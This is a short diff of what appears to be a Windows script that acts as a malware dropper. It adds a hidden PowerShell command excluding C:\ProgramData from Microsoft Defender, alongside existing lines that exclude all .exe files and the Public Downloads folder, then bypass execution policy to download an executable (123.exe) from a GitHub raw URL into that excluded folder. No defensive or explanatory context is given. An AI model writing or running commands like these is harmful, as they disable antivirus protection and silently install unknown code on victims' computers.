@@ -1,3 +1,7 @@
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+
+
+
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/123.exe' -OutFile 'C:\Users\Public\Downloads\123.exe'"
